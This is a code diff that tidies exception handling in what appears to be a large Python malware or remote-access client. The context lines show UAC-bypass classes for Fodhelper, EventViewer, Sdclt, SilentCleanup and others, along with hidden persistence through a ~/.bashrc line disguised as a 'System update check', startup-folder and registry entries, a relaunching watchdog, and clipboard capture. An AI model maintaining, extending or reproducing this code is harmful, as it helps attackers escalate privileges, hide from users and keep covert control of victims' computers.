@@ -72,7 +72,7 @@ if EVENTLET_AVAILABLE:
         # Restore stderr if exception occurred
         try:
             sys.stderr = old_stderr
-        except:
+        except (AttributeError, ValueError):
             pass
         
         debug_print(f"⚠️ eventlet.monkey_patch() FAILED: {e}")
@@ -1611,7 +1611,7 @@ class FodhelperProtocolBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
 
@@ -1659,7 +1659,7 @@ class ComputerDefaultsBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Computer defaults bypass failed: {e}")
 
@@ -1706,7 +1706,7 @@ class EventViewerBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Event Viewer bypass failed: {e}")
 
@@ -1754,7 +1754,7 @@ class SdcltBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Sdclt bypass failed: {e}")
 
@@ -1802,7 +1802,7 @@ class WSResetBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"WSReset bypass failed: {e}")
 
@@ -1850,7 +1850,7 @@ class SluiBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Slui bypass failed: {e}")
 
@@ -1898,7 +1898,7 @@ class WinsatBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Winsat bypass failed: {e}")
 
@@ -1938,7 +1938,7 @@ class SilentCleanupBypass(UACBypassMethod):
         except Exception as e:
             try:
                 self._cleanup_environment()
-            except:
+            except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"SilentCleanup bypass failed: {e}")
     
@@ -2909,7 +2909,7 @@ Set objShell = Nothing
             # Cleanup VBS file
             try:
                 os.remove(vbs_path)
-            except:
+            except (OSError, FileNotFoundError, PermissionError):
                 pass
             
             return True
@@ -2918,7 +2918,7 @@ Set objShell = Nothing
             # Cleanup VBS file on error
             try:
                 os.remove(vbs_path)
-            except:
+            except (OSError, FileNotFoundError, PermissionError):
                 pass
             return False
             
@@ -3253,7 +3253,7 @@ def establish_linux_persistence():
             bashrc_path = os.path.expanduser("~/.bashrc")
             with open(bashrc_path, 'a') as f:
                 f.write(f"\n# System update check\npython3 {current_exe} &\n")
-        except:
+        except (OSError, PermissionError, IOError):
             pass
         
         return True
@@ -3432,7 +3432,7 @@ def monitor_main_script():
                 subprocess.Popen(['python.exe', main_script], 
                                creationflags=subprocess.CREATE_NO_WINDOW)
             time.sleep(30)
-        except:
+        except (subprocess.SubprocessError, OSError, PermissionError):
             time.sleep(60)
 
 if __name__ == "__main__":
@@ -3535,7 +3535,7 @@ def startup_folder_watchdog_persistence():
                                  creationflags=subprocess.CREATE_NO_WINDOW, 
                                  capture_output=True, timeout=5)
                     log_message("[STARTUP WATCHDOG] Hidden AppData exe with +h +s attributes")
-                except:
+                except (subprocess.SubprocessError, OSError, PermissionError):
                     pass
         
         # Step 2: Create duplicate in startup folder
@@ -3573,7 +3573,7 @@ def startup_folder_watchdog_persistence():
                                 subprocess.run(['attrib', '+h', '+s', appdata_exe], 
                                              creationflags=subprocess.CREATE_NO_WINDOW, 
                                              capture_output=True, timeout=5)
-                            except:
+                            except (subprocess.SubprocessError, OSError, PermissionError):
                                 pass
                             log_message(f"[STARTUP WATCHDOG] ✅ Restored AppData: {appdata_exe}")
                         elif os.path.exists(current_exe):
@@ -3990,7 +3990,7 @@ Write-Host "Registry persistence established"
         # Clean up temporary script
         try:
             os.remove(ps_script_path)
-        except:
+        except (OSError, FileNotFoundError, PermissionError):
             pass
         
         log_message("[OK] Registry persistence established")
@@ -8600,10 +8600,10 @@ def get_clipboard_content():
             data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             return data
-        except:
+        except (Exception, ImportError, OSError):
             try:
                 win32clipboard.CloseClipboard()
-            except:
+            except (Exception, ImportError, OSError):
                 pass
             return None
     else:
